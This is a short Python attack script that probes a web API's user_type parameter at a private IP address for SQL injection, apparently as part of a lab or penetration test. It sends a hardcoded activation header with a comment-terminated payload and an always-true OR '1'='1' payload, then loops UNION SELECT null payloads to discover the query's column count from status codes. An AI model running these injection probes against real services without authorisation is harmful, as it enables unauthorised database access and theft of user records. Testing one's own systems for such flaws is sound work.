#!/usr/bin/env python3
import requests

BASE_URL = "http://192.168.100.110:3333"
HEADERS = {"x-activate-code": "8d7a77ae-dac9-4397-afd6-44b92fd5b6f7"}


def check(payload, desc):
    params = {"user_type": payload, "fields": "student_id,name"}
    try:
        resp = requests.get(f"{BASE_URL}/api/v1/users", params=params, headers=HEADERS)
        print(f"[{resp.status_code}] {desc} => Payload: {payload}")
        if resp.status_code == 200:
            # print(f"    Output: {resp.text[:100]}...")
            pass
        elif resp.status_code == 500:
            print("    -> 500 Internal Server Error (Empty result or Crash)")
    except Exception as e:
        print(f"[ERR] {e}")


print("=== Verifying SQLi with Data Persistence ===")

# 1. Check singular 'student' (Does it return data?)
check("student", "Singular 'student'")

# 2. Check SQLi that preserves 'student' string
# If the query is: SELECT * FROM users WHERE user_type = '{payload}'
# Payload: student' --
# Query: SELECT * FROM users WHERE user_type = 'student' --'
# Should be VALID and return rows.
check("student' --", "Injection: student' --")

# 3. Check SQLi that forces True
# Payload: x' OR '1'='1' --
# Query: ... user_type = 'x' OR '1'='1' --'
# Should return ALL rows.
check("x' OR '1'='1' --", "Injection: OR 1=1")

# 4. Check UNION with valid first row
# Payload: student' UNION SELECT 1,2 --
# Need correct column count.
# I'll fuzz column count 1-10 again, but this time looking for 200 OK.
print("\n[-] Fuzzing Column Count with UNION...")
for i in range(1, 10):
    # Use 'student' to ensure first part has results?
    # Actually, UNION appends. If first part has results, result is not empty -> 200 OK.
    # If column count is wrong -> 500 (SQL Error).
    # If column count is right -> 200 OK.
    nulls = ",".join(["null"] * i)
    check(f"student' UNION SELECT {nulls} --", f"UNION {i} cols")
